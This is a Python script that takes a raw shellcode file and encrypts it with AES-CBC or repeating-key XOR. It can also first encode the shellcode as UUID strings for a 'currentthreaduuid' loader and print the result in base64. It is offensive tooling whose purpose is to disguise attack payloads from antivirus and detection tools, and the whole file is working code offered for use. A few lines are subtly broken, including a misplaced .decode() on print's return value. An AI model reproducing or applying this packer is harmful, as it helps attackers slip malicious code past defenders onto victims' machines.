#!/usr/bin/env python3

import os
import uuid
import hashlib
from base64 import b64encode
from argparse import ArgumentParser

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend


class AES:

	def __init__(self, password, iv): 
		self.key = hashlib.sha256(password.encode()).digest()
		self.iv = iv

	def encrypt(self, raw):
		backend = default_backend()
		padder = padding.PKCS7(128).padder()
		raw = padder.update(raw) + padder.finalize()
		cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv), backend=backend)
		encryptor = cipher.encryptor()
		return self.iv + encryptor.update(raw) + encryptor.finalize()


class XOR:

	def __init__(self, key):
		self.key = key

	def encrypt(self, raw):
		output = b''
		for i in range(len(raw)):
			c = raw[i]
			k = self.key[i % len(self.key)]
			output += bytes([c ^ ord(k)])

		return output


def parse_args():
	parser = ArgumentParser()
	parser.add_argument('shellcode_bin', action='store', type=str,
                                         help='shellcode binary file path')
	parser.add_argument('-p', '--password', action='store', type=str, required=True,
                                            help='password to encrypt the shellcode with')
	parser.add_argument('-a', '--algorithm', action='store', type=str, default='aes', choices=['aes', 'xor'],
                                             help='algorithm to encrypt the shellcode with')
	parser.add_argument('-o', '--output', action='store', type=str,
                                          help='output file path')
	parser.add_argument('--uuid', action='store_true', default=False,
                                  help='convert the shellcode to UUID string before encrypting (used in "currentthreaduuid")')
	parser.add_argument('--base64', action='store_true', default=False,
                                    help='print the output in base64')
	return parser.parse_args()


if __name__ == '__main__':
	args = parse_args()

	with open(args.shellcode_bin, 'rb') as fd:
		shellcode = fd.read()

	if args.uuid:
		if len(shellcode) % 16:
			null_nytes = b'\x00' * (16 - (len(shellcode) % 16))
			shellcode += null_nytes

		concatedUuids = b''
		for i in range(0, len(shellcode), 16):
			uuid_str = str(uuid.UUID(bytes_le=shellcode[i:i+16]))
			concatedUuids += uuid_str.encode() + b'|'

		shellcode = concatedUuids

	if args.algorithm == 'aes':
		iv = os.urandom(16)
		ctx = AES(args.password, iv)
		enc = ctx.encrypt(shellcode)
	elif args.algorithm == 'xor':
		ctx = XOR(args.password)

	enc = ctx.encrypt(shellcode)

	if args.base64:
		enc = b64encode(enc)

	if args.output:
		with open(args.output, 'wb') as fd:
			fd.write(enc)
		print(f'[+] Encrypted shellcode file: {args.output}')
	elif args.base64:
		print(enc).decode().strip()